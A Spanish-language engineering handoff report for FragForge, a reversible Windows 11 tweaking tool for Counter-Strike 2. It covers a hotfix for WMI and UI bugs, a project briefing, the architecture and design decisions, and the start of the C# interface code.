# FragForge — Capa 0 · Informe de entrega completo

**Rama:** `arena/c1a5f702-evo-optimizer-cs2` (base `main@41af03d`, entrega `a2c5429`)
**Fecha:** 2026-11-13 · **Destino:** MiniPC ASUS PN64 (i3-1220P, UHD, 16 GB, SA400, I225-V + AX210, Win11 Pro 26200 es-MX)
**Estado verificado:** solución de 7 proyectos compila **0 warnings / 0 errores**; **103 tests xUnit verdes**; CLI smoke-tested.

Repositorio: todos los archivos listados abajo existen en el árbol de trabajo y están versionados (122 archivos versionados).

## Índice
0. **[Hotfix de la PARTE A (posterior a esta entrega)](#hotfix-parte-a--correcciones-sobre-la-pc-real)** — qué se rompía en la PC real y qué se cambió
0. [Briefing compacto para otra sesión de Claude](#0-briefing-compacto-para-otra-sesión-de-claude-copiarpegar)
1. [Arquitectura y decisiones](#1-arquitectura-y-decisiones)
2. [Árbol de carpetas](#2-árbol-de-carpetas)
3. Inventario de archivos con contenido completo (secciones 3a–3i)
   * [3a Core](#3a-fragforgecore--código-completo) · [3b Actions](#3b-fragforgeactions--código-completo) · [3c Tweaks](#3c-fragforgetweaks--catálogo-esquema-localización-y-validadores) · [3d Composition](#3d-fragforgecomposition--raíz-de-composición-y-reportes) · [3e Cli](#3e-fragforgecli--fragforgeexe) · [3f App](#3f-fragforgeapp--shell-wpf-mvvm) · [3g Tests](#3g-tests--fakes-motor-acciones-catálogo-e-integración) · [3h Raíz](#3h-raíz-de-la-solución-build-documentación-y-ci) · [3i Catálogo](#3i-catálogo-de-semillas--tabla-resumen)
4. [Comandos exactos](#4-comandos-exactos-de-restorebuildtestpublish)
5. [Supuestos y limitaciones](#5-supuestos-y-limitaciones-honestas-verificables)
6. [Contrato para la Capa 1](#6-contrato-para-la-capa-1-medición-ab-y-diagnóstico-extendido)

---

## Hotfix PARTE A — correcciones sobre la PC real

> **Qué es esta sección.** El informe de abajo es la entrega original de la Capa 0 (commit `a2c5429`)
> y **no se reescribe**: describe el árbol de ese commit. Esta sección documenta encima los cambios
> posteriores, hechos tras ejecutar `dotnet run` de la App WPF en la PC objetivo (Windows 11 Pro
> 26200, es-MX, elevada). Nada de este hotfix se verificó ejecutando código: **no hay `dotnet` en el
> entorno de trabajo**, así que lo compila y lo prueba el usuario.

### Síntomas observados

| # | Síntoma | Causa real |
|---|---|---|
| 1 | Los 3 tweaks de perfil Safe salían **"No aplicable"** con motivo *"Arquitectura 64 bits; se requiere X64."* en un equipo x64 | `Win32_OperatingSystem.OSArchitecture` devuelve **texto localizado** ("64 bits" en es-MX) y se comparaba contra el literal `"X64"` del catálogo |
| 2 | `TPM=NotPresent` + aviso *"Win32_Tpm: Espacio de nombres no válido"* | Namespace **inexistente** (`root\Microsoft\Windows\TPM`) y, además, la excepción se convertía en lista vacía ⇒ `NotPresent` |
| 3 | Aviso *"MSFT_NetAdapter: Consulta no válida"* | El namespace **ya era correcto**; lo que fallaba era pedir 9 propiedades de golpe: una inexistente tumba la consulta entera |
| 4 | Combos "Perfil" e "Idioma" sin selección; contador decía 30 y la tabla mostraba 3 | El valor por defecto del idioma podía no existir en la lista; el contador contaba el catálogo, no lo filtrado. **Los 3 de 30 no eran un bug**: es el filtro por perfil (`Safe=3`, `Balanced=7`, `Competitive=9`, `Advanced=12`) |
| 5 | Encabezado de la tabla ilegible | No existía **ningún** estilo de `DataGridColumnHeader`: WPF usaba su chrome claro con el texto claro heredado |

### Archivos tocados y qué cambió

| Archivo | Cambio |
|---|---|
| `src/FragForge.Core/Models/ArchitectureInterpreter.cs` | **nuevo** — `OsArchitectureKind` (`Unknown/X86/Arm/X64/Arm64`); mapea el número de `Win32_Processor.Architecture` (0/5/9/12), `RuntimeInformation.OSArchitecture`, y `Parse` acepta el enum y el texto de WMI por compatibilidad |
| `src/FragForge.Core/Conditions/ConditionFactory.cs` | `WindowsCondition.Evaluate` compara **por enum**; si no reconoce → `Unknown` con "arquitectura desconocida". El motivo nombra el valor de enum |
| `src/FragForge.Core/Engine/TweakEngine.cs` | **cambio no pedido, ver abajo** — condición desconocida ⇒ `TweakState.Unknown`, no `NotApplicable` |
| `src/FragForge.Actions/Platform/HardwareProfiler.cs` | pide `Architecture` (numérico) en `Win32_Processor` y deja de pedir `OSArchitecture`; `TpmScope = root\CIMV2\Security\MicrosoftTpm`; `QueryOrFail` que distingue **fallo** de **lista vacía**; `ResolveTpmState`; red en dos pasos (`ReadNetAdapterRowsAsync`) |
| `src/FragForge.Core/Localization/CultureDefaults.cs` | **nuevo** — la cultura inicial siempre existe en la lista de opciones; `null` si no hay ninguna |
| `src/FragForge.App/ViewModels/MainViewModel.cs` | `TweakCountText` ("Mostrando N de M tweaks en el perfil X"), `Profiles` como opciones con etiqueta, `SelectedProfileOption` por valor, cultura inicial desde `CultureDefaults` |
| `src/FragForge.App/MainWindow.xaml` | combo de perfil por valor + contador visible |
| `src/FragForge.App/App.xaml` | estilos de `DataGridColumnHeader` y `DataGridCell` acordes al tema oscuro |

### El cambio NO pedido: `TweakEngine` y `TweakState.Unknown`

**Qué se cambió.** En dos puntos de `src/FragForge.Core/Engine/TweakEngine.cs`:

* **`EvaluateAsync`, línea 336** (scan):
  ```csharp
  var state = condition.IsKnown ? TweakState.NotApplicable : TweakState.Unknown;
  return new(definition.Id, state, condition.Reason, [], []);
  ```
* **`ApplyCoreAsync`, línea 101** (apply):
  ```csharp
  results.Add(Skipped(definition.Id, condition.IsKnown ? TweakState.NotApplicable : TweakState.Unknown, condition.Reason));
  ```

**Por qué se hizo.** Es la otra mitad del bug de arquitectura. Al arreglar solo `ConditionFactory`, la
condición ya devuelve `IsKnown = false` para una arquitectura irreconocible, pero el motor seguía
convirtiendo *cualquier* `!IsMet` en **"No aplicable"**. Es decir: la UI habría seguido afirmando "esto
no aplica en tu equipo" sobre algo que **no se pudo medir**. R-L dice Unknown antes que adivinar; si el
estado mostrado dice "No aplicable", la app está adivinando. Sin este cambio, el arreglo de la Etapa 1
queda a medias: se detecta bien y se comunica mal.

**¿La UI lo trata bien?** Sí, verificado leyendo el código:

* `TweakItemViewModel.Update` (`src/FragForge.App/ViewModels/TweakItemViewModel.cs:34`) resuelve el
  texto con `localizer["state." + status.State]`. La clave **ya existe en los dos idiomas**:
  `state.Unknown` = `"Desconocido"` (`es-MX.json:18`) y `"Unknown"` (`en-US.json:18`). No hay clave
  faltante, no se muestra una clave cruda.
* El campo `TweakState state` de ese ViewModel **ya arrancaba en `TweakState.Unknown`**
  (`TweakItemViewModel.cs:20`), así que el estado no es nuevo para la UI.
* No hay ningún `switch` exhaustivo sobre `TweakState` que pudiera quedarse sin rama.

**¿El apply path lo trata bien?** Sí, y esto importa porque *empeora* deliberadamente un caso:

* `ExperimentRunner.EnsureArmStateAsync` (`src/FragForge.Core/Experiments/ExperimentRunner.cs:199-200`)
  acepta para el brazo base `NotApplied`, `NotApplicable` o `Inspected`, y para el candidato
  `Applied`, `AppliedExternally` o `Inspected`. **`Unknown` no está en ninguna lista**, así que una
  condición desconocida **invalida la medición** con "Estado inesperado tras preparar el brazo".
* Eso es **intencional y correcto**: antes, con `NotApplicable`, el brazo base se daba por bueno y el
  experimento seguía adelante sobre un estado que nadie había podido determinar. Un A/B montado sobre
  un "no sé" produce números que parecen evidencia. Fallar cerrado es lo honesto.
* El coste: un equipo con arquitectura irreconocible **no podrá correr experimentos** hasta que se
  resuelva la arquitectura. Es el mismo criterio que ya aplica `CapabilityGate` a otras
  precondiciones, y es preferible a un veredicto inventado.
* `DriftService` (`src/FragForge.Core/Drift/DriftService.cs:77`) solo compara contra
  `Applied`/`AppliedExternally`, así que `Unknown` cae en la rama de "deriva perdida" igual que antes;
  no hay cambio de comportamiento ahí.

**Por qué no se revierte.** Revertirlo dejaría el arreglo de la Etapa 1 a medias (detección correcta,
mensaje incorrecto). Si se prefiere el comportamiento anterior, basta con cambiar las dos líneas
citadas; quedan aisladas y comentadas precisamente para que se puedan discutir.

### Lo que NO se verificó en la PARTE A

1. **Nada se ejecutó.** Sin `dotnet` no hubo compilación ni un solo test corrido. El único chequeo
   automático fue tree-sitter sobre los archivos tocados (sintaxis), que **no es compilar**.
2. **Los combos vacíos no se reprodujeron en código.** El binding era correcto y había valor por
   defecto. Lo corregido es la causa *posible* (valor inicial fuera de la lista) y el chrome claro.
   **Si tras `dotnet run` siguen vacíos, la causa es otra** y hay que reportarlo.
3. **La propiedad exacta de `MSFT_NetAdapter` que fallaba no se identificó.** La solución es
   defensiva (pide solo las que el sistema acepta), no un diagnóstico.
4. **No hay test de UI.** `FragForge.Tests` apunta a `net10.0` y la App a `net10.0-windows`: el
   proyecto de tests no puede referenciar la App sin retargetear la suite. Se testea la lógica pura.
5. **El chrome claro sigue afectando a `ComboBox`, `CheckBox` y `ScrollBar`** (sin plantilla propia).
   Solo se arregló lo pedido: el encabezado de la tabla. Anotado en `docs/descartados.md`.

### Tests añadidos por el hotfix

| Archivo | Qué fija |
|---|---|
| `tests/FragForge.Tests/Core/ArchitectureHotfixTests.cs` | "64 bits" ⇒ Aplicable; `9` ⇒ Aplicable; `12` ⇒ no aplica y nombra `Arm64`; desconocido ⇒ `IsKnown=false` + "arquitectura desconocida"; 1/2/3/4/8/99/null no se pliegan a x64 |
| `tests/FragForge.Tests/Core/TpmAndNetworkHotfixTests.cs` | consulta que **lanza** ⇒ `Unknown` (antes `NotPresent`); 0 instancias ⇒ `NotPresent`; 1 instancia ⇒ `Enabled`/`Disabled`; namespaces fijados; perfil completo sobrevive a fallos de TPM y red |
| `tests/FragForge.Tests/Catalog/RealCatalogArchitectureTests.cs` | catálogo **real embebido** contra el perfil PN64 en memoria: 30 tweaks, 3 en Safe, los 3 Aplicables, `cpu.epp-performance` cumple su condición `windows` |
| `tests/FragForge.Tests/Core/CultureDefaultsTests.cs` | la cultura inicial siempre existe en la lista de opciones |

---

## 0. Briefing compacto para otra sesión de Claude (copiar/pegar)

> Pega este bloque completo al inicio de una sesión nueva. El informe extenso está en
> `docs/handoff/FragForge-Capa0-Informe.md` (todos los archivos con su código completo).

---

### Contexto

Proyecto **FragForge**: optimizador profesional y **reversible** para Windows 11 orientado a Counter-Strike 2
(FPS, estabilidad de frametime, latencia de entrada). Repo: `EvoMaxPC/Evo_optimizer_CS2`,
rama de trabajo `arena/c1a5f702-evo-optimizer-cs2` (base `main@41af03d`, entrega `a2c5429`).

**La Capa 0 está terminada y verificada**: solución .NET 10 de 7 proyectos, compila con
0 warnings / 0 errores y **103 tests xUnit pasan**. La Capa 1 (medición A/B) está diseñada pero **no implementada**.

### Hardware objetivo (FIJO, no asumir otro)

ASUS MiniPC PN64, BIOS AMI 3.12.00 UEFI · Intel i3-1220P (2P + 8E, 12 hilos, 28 W, híbrido con Thread Director) ·
solo iGPU Intel UHD (sin NVIDIA/AMD) · 16 GB RAM (verificar dual-channel) · SSD Kingston SA400S37480G SATA ·
Intel I225-V + Wi-Fi 6E AX210 · TPM 2.0 · SecureBoot/VBS/HVCI: **detectar, nunca asumir** ·
Windows 11 Pro build 26200 (25H2), es-MX, UTC-3, usuario `ZuKA` · Atlas Playbook v0.5.0 ya aplicado.

### Estructura

```
src/FragForge.Core/         motor puro, sin Windows: Models, Abstractions, Engine, Conditions,
                            Persistence (snapshot/journal/gate/denylist), Preflight, Localization
src/FragForge.Actions/      adaptadores Windows: Registry, IFEO, Service, ScheduledTask, PowerPlan,
                            Bcdedit, NetAdapterProperty, FileEdit, PowerShell, InspectOnly,
                            Platform (WMI, CPU topology, System Restore, HardwareProfiler)
src/FragForge.Tweaks/       catálogo JSON embebido (10 seeds), JSON Schema propio, validador semántico, i18n
src/FragForge.Composition/  CompositionRoot (DI + Serilog), ReportService (JSON/HTML)
src/FragForge.Cli/          fragforge.exe: scan, list, apply, revert, status, snapshot, export-report, doctor
src/FragForge.App/          WPF MVVM (CommunityToolkit.Mvvm 8.4.1), tema oscuro
tests/FragForge.Tests/      103 tests sobre fakes (sin WMI/registro reales)
```

### Invariantes que NO se pueden romper

1. **Reversibilidad exacta**: cada `ITweakAction` captura `ActionState` y restaura el estado previo,
   incluido *"el valor no existía"* ⇒ `DeleteValue` (+ limpieza de ancestros vacíos).
2. **Transacción por tweak**: `Apply → Verify`; si `Verify` falla ⇒ rollback inverso de las acciones
   intentadas ⇒ se detiene el lote ⇒ exit code 5 si el rollback falla.
3. **Journal append-only con cadena SHA-256**; `revert` exige `VerifyIntegrityAsync` antes de tocar nada.
4. **`--force` solo** omite idempotencia y detección de deriva. **Nunca** omite denylist, condiciones,
   perfil de riesgo ni preflight (reboot pendiente, TiWorker/TrustedInstaller, espacio, System Protection).
5. **`Unknown` ≠ `Disabled`**: condiciones tri-estado; si no hay evidencia, el tweak no aplica.
6. **Nunca por defecto**: Defender, Firewall, Windows Update, Secure Boot/TPM, mitigaciones de CPU, VBS/HVCI.
   Servicios intocables: `WinDefend, mpssvc, BFE, RpcSs, DcomLaunch, PlugPlay, Power, EventLog, CryptSvc,
   TrustedInstaller, ipfsvc, jhi_service, cplspcon, WMIRegistrationService`.
7. **Anti-cheat**: sin inyección, sin leer/escribir memoria de `cs2.exe`, sin drivers propios.
8. Tweaks Advanced/Experimental ⇒ perfil `Advanced` + `--accept-risk <id>` + frase literal **`ACEPTO EL RIESGO`**.
9. `HKCU` se resuelve al SID interactivo (`HKU\<SID>`), nunca al hive del proceso elevado.
10. **Cero placeholders**: todo archivo compila como está; `TreatWarningsAsErrors` activo en Core.

### Decisiones ya tomadas (no re-litigar)

* .NET 10 LTS (no 8: EOL nov-2026) · WPF + CommunityToolkit.Mvvm · M.E.Hosting/DI + Serilog ·
  System.Text.Json (`$actionState` como discriminador) · xUnit 2.9.3 · versiones centralizadas en
  `Directory.Packages.props` · `%ProgramData%\FragForge\` como raíz de datos
  (`snapshots/`, `journal/journal.ndjson`, `logs/`, `reports/`, `policy/denylist.json`, `.fragforge.lock`).
* Catálogo declarativo JSON validado con esquema **y** semántica al arrancar (si falla, no se ejecuta nada).
* Punto de restauración: se pone `SystemRestorePointCreationFrequency=0` temporalmente y se restaura en `finally`.
* Publicación: `-r win-x64 --self-contained true -p:PublishSingleFile=true`; `RuntimeIdentifier` solo se
  aplica al pasar `-r` (así `dotnet build` de Core/Actions/Tweaks/Composition/Tests funciona en Linux).

### Estado exacto de verificación

| Qué | Estado |
|---|---|
| `dotnet build FragForge.sln -c Release` (7 proyectos, incl. WPF) | ✅ 0 warnings / 0 errores |
| `dotnet test tests/FragForge.Tests` | ✅ 103/103 |
| CLI `scan`, `apply --dry-run`, `doctor`, códigos 0/2 | ✅ en Linux (plataforma no soportada ⇒ `NotApplicable`, por diseño) |
| Adaptadores Windows reales (registro/WMI/powercfg/bcdedit/servicios/tareas/red/System Restore) | ❌ **no ejecutados aún** — primera pasada pendiente en el PN64 |
| `SystemRestoreService.GetProtectionStateAsync` | ⚠️ heurística no validada (`Win32_Volume` ↔ `Win32_ShadowStorage`); fallback `Unknown` |
| Parseo de `bcdedit /enum {current} /v` en es-MX | ⚠️ por validar |

### Pendiente inmediato (orden sugerido)

1. **Validar en el PN64**: `fragforge doctor` → `scan` → `apply --profile Safe --dry-run` →
   aplicar 1 tweak → `status` → `revert --last` y comparar. Reportar cualquier desviación en WMI/parseo.
2. Validar `GetProtectionStateAsync` con protección activada y desactivada; si falla, dejar `Unknown` y
   exigir `--enable-system-protection` o `--no-restore-point`.
3. Capa 1: implementar `IExperimentHook` con PresentMon (ETW, no inyección) + persistencia
   `%ProgramData%\FragForge\experiments\<id>\` (`session.json` + CSV) y promoción de `EvidenceLevel`
   solo con A/B reproducible (≥ 3 × 120 s, medianas, misma demo/resolución/plan de energía).
4. Firmar los binarios (SmartScreen) y adjuntar `docs/manual-revert.md` al instalador.

### Comandos rápidos

```powershell
dotnet restore FragForge.sln
dotnet build   FragForge.sln -c Release
dotnet test    tests/FragForge.Tests/FragForge.Tests.csproj -c Release
dotnet publish src/FragForge.Cli/FragForge.Cli.csproj -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o publish\cli
dotnet publish src/FragForge.App/FragForge.App.csproj -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o publish\app
```

CLI: `fragforge scan|list|apply|revert|status|snapshot|export-report|doctor` — exit codes
`0` éxito, `1` fallo, `2` uso, `3` preflight/catálogo, `4` cancelación, `5` rollback crítico.

### Documentos de referencia

| Archivo | Contenido |
|---|---|
| `docs/handoff/FragForge-Capa0-Informe.md` | Informe completo: arquitectura, árbol, **122 archivos con su código íntegro**, comandos, supuestos, contrato Capa 1 |
| `README.md` | Arquitectura, build/publish, cómo escribir un tweak (ejemplo JSON comentado) |
| `docs/manual-revert.md` | Reversión manual de emergencia por `$actionState` (.reg, .pow, .bcd, archivos) |
| `src/FragForge.Tweaks/Schema/tweak.schema.json` | Contrato exacto de un tweak |
| `src/FragForge.Core/Policy/denylist.json` | Política de seguridad central |

---

## 1. Arquitectura y decisiones

FragForge es un **motor de cambios transaccional** para Windows 11 orientado a CS2. La Capa 0 no promete FPS: garantiza que **todo cambio es reversible al estado exacto**, incluida la *no existencia* previa de un valor, y que cada tweak declara evidencia, riesgo y cuándo **no** aplicarlo.

### Flujo de una operación

```
preflight (plataforma/build/admin/reboot/TiWorker/espacio/System Protection)
  → resolución de dependencias y conflictos (topológico + detección de ciclos)
  → condiciones (tri-estado: Met / Unmet / Unknown; Unknown ≠ aplicable)
  → perfil de riesgo (Safe / Balanced / Competitive / Advanced)
  → idempotencia (Applied / AppliedExternally / Force)
  → snapshot: captura exacta por acción + artifacts (.reg, .pow, .bcd)
  → punto de restauración (SystemRestorePointCreationFrequency temporal = 0, restaurado en finally)
  → por tweak: por acción Apply → Verify
        Verify falla ⇒ rollback inverso de las acciones intentadas ⇒ se detiene el lote
  → journal append-only encadenado por SHA-256 (OperationStarted … TweakApplied … SnapshotReverted)
```

### Decisiones y su justificación

| Decisión | Justificación |
|---|---|
| **.NET 10 LTS** (`net10.0`; App `net10.0-windows`) | Soporte hasta nov-2028; .NET 8 expira nov-2026. SDK 10.0.400 fijado en `global.json` con `rollForward: latestFeature`. |
| **WPF + CommunityToolkit.Mvvm 8.4.1** | WPF está incluido en Windows (cero runtime extra). El toolkit solo genera `INotifyPropertyChanged`/`ICommand`; el motor no conoce la UI. La App **no** requiere admin para *mirar* (aunque el manifiesto pide elevación por coherencia con el motor real). |
| **Microsoft.Extensions.Hosting + DI + Serilog 4.3** | Composición explícita, `ILogger<T>` inyectable (tests con `NullLogger`), log estructurado rotativo (`logs/fragforge-<fecha>.log`, 14 días, 10 MB) + consola en CLI. |
| **Puertos/adaptadores para todo efecto** | `IRegistry`, `IProcessRunner`, `IServiceController`, `IScheduledTaskStore`, `INetworkAdapterController`, `ISystemRestoreService`, `IWmiQuery`, `ICpuTopologyProbe`, `IExecutionGate`, `IJournal`, `ISnapshotStore`. Resultado: **el 100 % de la lógica del motor se prueba en Linux con fakes**; solo los adaptadores necesitan Windows. |
| **Catálogo declarativo JSON + doble validación** | Un tweak = un archivo embebido. Validación **de esquema** (JSON Schema 2020-12 propio, sin dependencias) **y semántica** (IDs únicos, ciclos, conflictos inexistentes, localización obligatoria, referencias obligatorias, `PowerShell`/`Bcdedit` ⇒ riesgo Advanced/Experimental, denylist evaluada al construir la acción). El catálogo se valida al arrancar: si algo está mal, la aplicación no ejecuta nada. |
| **Captura/restauración separada del catálogo** | El `SystemSnapshot` guarda la `TweakDefinition` completa y el `ActionState` de cada acción. Si el tweak desaparece o cambia en una versión futura, el snapshot sigue siendo autosuficiente para revertir (se compara `DefinitionSha256`). |
| **Journal append-only con cadena SHA-256** | Cada entrada incluye `PreviousHash`/`Hash`. `revert` exige `VerifyIntegrityAsync` antes de tocar nada: una edición manual del journal bloquea la reversión en lugar de ejecutar sobre datos corruptos. |
| **Denylist central embebida + fusión desde `%ProgramData%`** | Seguridad por defecto (Defender, firewall, Update, DeviceGuard, servicios críticos, BCD) y ampliación consciente por el usuario sin recompilar. |
| **Todo offline** | Sin descargas ni scripts remotos. `PowerShellAction` está deshabilitada por defecto, exige `--allow-powershell`, perfil Advanced, aceptación por ID + frase literal, bloquea tokens de red/ejecución dinámica y persiste el SHA-256 de los 4 scripts. |
| **Anti-cheat seguro por diseño** | Nunca se inyecta código, nunca se lee/escribe memoria de `cs2.exe`, no hay drivers propios. Solo registro, servicios, tareas, energía, BCD (lista blanca), red, archivos de configuración de texto y (opcional) PowerShell local. |
| **Estados tri-estado en condiciones y seguridad** | `VBS/HVCI/SecureBoot/TPM/HAGS/MPO` y el canal de RAM se reportan `Unknown` cuando la evidencia es insuficiente. **`Unknown` nunca se interpreta como `Disabled`** ni habilita un tweak. |

### Semántica del motor (contratos que no se pueden relajar)

* `--force` **solo** omite idempotencia y detección de deriva. **Nunca** omite denylist, condiciones, perfil de riesgo ni preflight.
* Un `Verify` fallido ⇒ `RevertAsync` en orden inverso **de las acciones ya intentadas** de ese tweak, `TweakRolledBack`/`TweakRollbackFailed` en journal y **parada del lote**. Rollback fallido ⇒ código de salida **5** y mensaje crítico.
* Cancelación: `CancellationToken` en toda la superficie; el rollback y la escritura final del journal usan `CancellationToken.None` para no dejar estado a medias.
* Revertir exige **exactamente uno** de: IDs, `--snapshot` o `--last`.
* Sin snapshot, **no se deshacen** cambios externos/Atlas: `revert <id>` falla con explicación explícita.
* Si un tweak ya coincide y **no** fue aplicado por FragForge ⇒ `AppliedExternally` y **no se sobrescribe** (compatibilidad con Atlas Playbook v0.5.0).

## 2. Árbol de carpetas

```text
Evo_optimizer_CS2/
├─ FragForge.sln                      # 7 proyectos (GUIDs …0001–0007)
├─ Directory.Build.props              # net10.0, nullable, analyzers, TreatWarningsAsErrors solo Core
├─ Directory.Packages.props           # versiones centralizadas
├─ global.json                        # SDK 10.0.400 (rollForward latestFeature)
├─ NuGet.config / NuGet.offline.config
├─ README.md                          # arquitectura, build/publish, autoría de tweaks
├─ docs/
│  ├─ manual-revert.md                # reversión manual de emergencia por $actionState
│  └─ handoff/                        # este informe (generado)
├─ .github/workflows/ci.yml           # jobs linux (Core+Tests) y windows (full + publish)
├─ src/
│  ├─ FragForge.Core/
│  │  ├─ Abstractions/
│  │  ├─ Conditions/
│  │  ├─ Engine/
│  │  ├─ Localization/
│  │  ├─ Logging/
│  │  ├─ Models/
│  │  ├─ Persistence/
│  │  ├─ Policy/
│  │  ├─ Preflight/
│  ├─ FragForge.Actions/
│  │  ├─ Bcd/
│  │  ├─ DependencyInjection/
│  │  ├─ Diagnostics/
│  │  ├─ Files/
│  │  ├─ Network/
│  │  ├─ Platform/
│  │  ├─ Power/
│  │  ├─ Registry/
│  │  ├─ Scripting/
│  │  ├─ Services/
│  │  ├─ Tasks/
│  ├─ FragForge.Tweaks/
│  │  ├─ Catalog/
│  │  ├─ Localization/
│  │  ├─ Schema/
│  │  ├─ Validation/
│  ├─ FragForge.Composition/
│  ├─ FragForge.Cli/
│  ├─ FragForge.App/
│  │  ├─ Services/
│  │  ├─ ViewModels/
└─ tests/FragForge.Tests/             # xUnit 2.9.3: 12 archivos, 103 tests
   ├─ Actions/
   ├─ Catalog/
   ├─ Core/
   ├─ Fakes/
   ├─ Integration/
```

### Recuento por proyecto (solo código)

| Proyecto | Archivos .cs | Líneas |
|---|---:|---:|
| `src/FragForge.Core` | 31 | 2113 |
| `src/FragForge.Actions` | 28 | 1809 |
| `src/FragForge.Tweaks` | 4 | 211 |
| `src/FragForge.Composition` | 4 | 207 |
| `src/FragForge.Cli` | 3 | 275 |
| `src/FragForge.App` | 5 | 332 |
| `tests/FragForge.Tests` | 12 | 1668 |

Catálogo: 10 tweaks JSON + esquema + 2 archivos de localización. Total de archivos versionados: 122.

### Archivos más grandes (complejidad concentrada)

```text
src/FragForge.Core/Engine/TweakEngine.cs                                576 líneas
tests/FragForge.Tests/Actions/ActionTests.cs                            429 líneas
tests/FragForge.Tests/Core/EngineTests.cs                               303 líneas
src/FragForge.Actions/Platform/HardwareProfiler.cs                      210 líneas
src/FragForge.App/ViewModels/MainViewModel.cs                           207 líneas
src/FragForge.Actions/Power/PowerPlanAction.cs                          176 líneas
src/FragForge.Core/Conditions/ConditionFactory.cs                       175 líneas
src/FragForge.Core/Models/HardwareProfile.cs                            171 líneas
tests/FragForge.Tests/Core/RegistryActionTests.cs                       170 líneas
tests/FragForge.Tests/Catalog/CatalogTests.cs                           163 líneas
src/FragForge.Cli/Program.cs                                            160 líneas
src/FragForge.Actions/Registry/RegistryAction.cs                        144 líneas
src/FragForge.Core/Models/ActionState.cs                                124 líneas
src/FragForge.Core/Persistence/ProtectionPolicy.cs                      122 líneas
tests/FragForge.Tests/Fakes/TestSupport.cs                              116 líneas
```

---


---

## 3. Inventario de archivos (contenido completo)

Cada bloque indica la ruta relativa al repo y contiene el archivo **íntegro**, sin recortes ni elipsis.
Los 122 archivos versionados están cubiertos en las secciones 3a–3i.

---

## 3a. FragForge.Core — código completo

### `src/FragForge.Core/Abstractions/IApplicationServices.cs`  <sub>(16 líneas)</sub>

````csharp
using FragForge.Core.Models;

namespace FragForge.Core.Abstractions;

public sealed record ReportDocument(int SchemaVersion, DateTimeOffset CreatedAt, string ApplicationVersion, HardwareProfile Hardware, IReadOnlyList<TweakStatus> Tweaks, PreflightReport Preflight, IReadOnlyList<SnapshotListItem> Snapshots, JournalIntegrity JournalIntegrity, IReadOnlyList<JournalEntry> RecentJournal);
public interface IReportService
{
    Task<ReportDocument> CreateAsync(CancellationToken cancellationToken = default);
    Task ExportAsync(string path, string format, CancellationToken cancellationToken = default);
}
public interface IApplicationContext
{
    string Culture { get; set; }
    string DataRoot { get; }
    string ApplicationVersion { get; }
}
````

### `src/FragForge.Core/Abstractions/IContracts.cs`  <sub>(110 líneas)</sub>

````csharp
using FragForge.Core.Models;

namespace FragForge.Core.Abstractions;

public interface ITweakCondition
{
    string Type { get; }
    ConditionResult Evaluate(HardwareProfile profile);
}
public interface ITweakConditionFactory
{
    IReadOnlySet<string> SupportedTypes { get; }
    ITweakCondition Create(ConditionSpec specification);
}
public interface IHardwareProfiler
{
    Task<HardwareProfile> ProfileAsync(CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null);
}
public interface IWmiQuery
{
    Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>> QueryAsync(string scope, string className, IReadOnlyList<string> properties, string? where = null, CancellationToken cancellationToken = default);
}
public interface ITweakCatalog
{
    IReadOnlyList<TweakDefinition> Definitions { get; }
    TweakDefinition Get(string id);
    bool TryGet(string id, out TweakDefinition? definition);
    string GetDefinitionHash(string id);
}
public interface ITweakEngine
{
    Task<ScanReport> ScanAsync(CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null);
    Task<BatchReport> ApplyAsync(IEnumerable<string> ids, ApplyOptions options, CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null);
    Task<BatchReport> RevertAsync(RevertRequest request, CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null);
    Task<TweakStatus> GetStateAsync(string id, CancellationToken cancellationToken = default);
    Task<SystemSnapshot> CreateSnapshotAsync(string label, bool createRestorePoint = true, CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null);
}
public interface ISnapshotStore
{
    string RootPath { get; }
    string GetArtifactDirectory(string snapshotId);
    Task SaveAsync(SystemSnapshot snapshot, CancellationToken cancellationToken = default);
    Task<SystemSnapshot> GetAsync(string snapshotId, CancellationToken cancellationToken = default);
    Task<IReadOnlyList<SystemSnapshot>> ListAsync(CancellationToken cancellationToken = default);
}
public interface IJournal
{
    Task AppendAsync(JournalEntry entry, CancellationToken cancellationToken = default);
    Task<IReadOnlyList<JournalEntry>> ReadAllAsync(CancellationToken cancellationToken = default);
    Task<JournalIntegrity> VerifyIntegrityAsync(CancellationToken cancellationToken = default);
}
public interface IExecutionGate
{
    Task<IAsyncDisposable> AcquireAsync(CancellationToken cancellationToken = default);
}
public interface ISystemRestoreService
{
    Task<FeatureState> GetProtectionStateAsync(CancellationToken cancellationToken = default);
    Task EnableProtectionAsync(CancellationToken cancellationToken = default);
    Task<RestorePointResult> CreateAsync(string description, CancellationToken cancellationToken = default);
}
public interface IPreflightService
{
    Task<PreflightReport> CheckAsync(ApplyOptions options, HardwareProfile profile, CancellationToken cancellationToken = default);
}
public interface IProtectionPolicy
{
    void EnsureRegistryAllowed(string key, string? valueName = null);
    void EnsureServiceAllowed(string name);
    void EnsureTaskAllowed(string path);
    void EnsureBcdAllowed(string element);
    void EnsureFileAllowed(string path);
    void EnsurePowerShellAllowed(string script);
    void EnsureNetworkPropertyAllowed(string adapterName, string keyword);
}
public interface IServiceController
{
    Task<ServiceCapture> GetAsync(string name, CancellationToken cancellationToken = default);
    Task SetStartModeAsync(string name, string startMode, bool? delayedAutoStart, CancellationToken cancellationToken = default, bool restoreAbsentDelayed = false);
    Task SetStateAsync(string name, string state, CancellationToken cancellationToken = default);
}
public interface IScheduledTaskStore
{
    Task<ScheduledTaskActionState> GetAsync(string path, CancellationToken cancellationToken = default);
    Task SetEnabledAsync(string path, bool enabled, CancellationToken cancellationToken = default);
}
public interface INetworkAdapterController
{
    Task<NetworkPropertyCapture> GetAsync(string adapterName, string keyword, CancellationToken cancellationToken = default);
    Task SetAsync(string adapterName, string keyword, IReadOnlyList<string> value, CancellationToken cancellationToken = default);
}
public interface IGameLocator
{
    Task<GameInfo> LocateCs2Async(CancellationToken cancellationToken = default);
}
public interface IDiagnosticProbe
{
    string Key { get; }
    Task<DiagnosticObservation> ReadAsync(HardwareProfile profile, CancellationToken cancellationToken = default);
}
public interface IExperimentHook
{
    int Order { get; }
    Task<IReadOnlyList<ExperimentArtifact>> RunAsync(ExperimentContext context, CancellationToken cancellationToken = default);
}
public interface IUiLogSink
{
